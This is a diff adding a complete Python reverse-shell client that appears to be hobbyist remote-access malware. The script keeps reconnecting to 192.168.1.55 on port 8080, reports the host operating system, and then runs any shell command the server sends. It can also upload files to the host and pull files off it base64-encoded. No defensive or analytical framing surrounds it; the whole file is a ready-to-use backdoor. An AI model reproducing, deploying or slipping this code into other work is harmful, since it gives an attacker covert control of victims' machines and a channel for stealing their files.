@@ -1,0 +1,98 @@
+#!/usr/bin/python
+
+""" Imports """
+import socket
+import subprocess
+import json
+import os
+import sys
+import base64
+import platform
+import time
+
+
+def sent(data):
+    """ Send data """
+    json_data = json.dumps(data)
+    sock.send(json_data)
+
+
+def recvd():
+    """ Receive data """
+    data = ""
+    while True:
+        try:
+            data = data + sock.recv(1024)
+            return json.loads(data)
+        except ValueError:
+            continue
+
+
+def shell():
+    """ Shell """
+    so = platform.system()  # Detect system operative
+    sent(so)                # Send info of system operative
+    while True:
+        cmd = recvd()
+        if cmd == 'exit':
+            break
+        elif cmd[:4] == "help":
+            ops = """ 
+            cd      --> Get current directory
+            curr    --> Current directory
+            Run     --> Execute a program
+            Upload  --> Upload a File to Client
+            Downlod --> Downlod a File to Server
+            Exit    --> Finish shell
+            """
+            sent(ops)
+        elif cmd[:2] == "cd" and len(cmd) > 1:
+            try:
+                if not os.chdir(cmd[3:]):
+                    pass
+            except:
+                continue
+        elif cmd[:4] == 'curr':
+            sent(os.getcwd())
+        elif cmd[:8] == "download":
+            with open(cmd[9:], "rb") as up_file:
+                sent(base64.b64encode(up_file.read()))
+        elif cmd[:6] == "upload":
+            with open(cmd[7:], "wb") as down_file:
+                file_data = recvd()
+                down_file.write(base64.b64decode(file_data))
+        elif cmd[:3] == "run":
+                try:
+                    subprocess.Popen(cmd[4:], shell=True)
+                    sent("[*] running")
+                except ValueError as err:
+                    sent("Failed {}".format(err))
+        else:
+            proc = subprocess.Popen(cmd, shell=True,
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE)
+            result = proc.stdout.read() + proc.stderr.read()
+            sent(result)
+
+
+def connection():
+    """ Connection """
+    global sock
+    """ Create socket """
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    """ Connect to server on hold """
+    while True:
+        time.sleep(5)
+        try:
+            sock.connect(("192.168.1.55", 8080))
+            sent("[+] Connected")
+            shell()
+        except:
+            connection()
+    """ Close socket """
+    sock.close()
+
+
+if __name__ == "__main__":
+    connection()
